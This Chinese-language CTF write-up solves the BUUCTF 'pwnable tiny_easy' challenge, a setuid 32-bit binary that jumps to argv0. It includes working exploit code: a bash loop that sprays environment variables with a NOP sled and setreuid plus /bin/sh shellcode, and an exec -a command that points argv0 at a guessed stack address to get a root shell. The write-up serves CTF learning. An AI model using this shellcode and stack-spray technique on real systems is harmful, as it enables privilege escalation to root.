# buuctf-pwnable_tiny_easy



### 总结

环境变量利用或者`argv`的利用。

<!-- more -->

### checksec

![image-20220405140544050](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405140544050.png)

带有`suid`。

### 漏洞点

![image-20220405140605839](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405140605839.png)

调试发现，`edx`实际为`argv0`

### 利用思路

远程开启了`ASLR`，所以需要猜测下栈地址，不过由于是`32`位，所以猜对的概率还是很大的。远程有`python`，可以利用`python`来输入不可见字符。

这里直接利用环境变量，首先导出足够多的环境变量：

```bash
for i in $(seq 1 500); do export RODERICK_$i=$(python -c 'print "\x90"*0x1000+"j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"');done;
```

后面的`shellcode`为：`asm(shellcraft.i386.linux.setreuid()+shellcraft.i386.linux.sh())`

- 利用`execl`等函数，将`argv0`修改为一个栈地址；当然也可以用`exec`命令，使用`-a`选项：`exec -a $(python -c "print '\xc0\xc0\xc0\xff'") ./tiny_easy &`
- 多试几次即可获得`root shell`

### EXP

```bash
for i in $(seq 1 500); do export RODERICK_$i=$(python -c 'print "\x90"*0x1000+"j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"');done;

exec -a $(python -c "print '\xc0\xc0\xc0\xff'") ./tiny_easy &
```

打远程：

![image-20220405141530155](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405141530155.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-04-05-buuctf-pwnable-tiny-easy/  

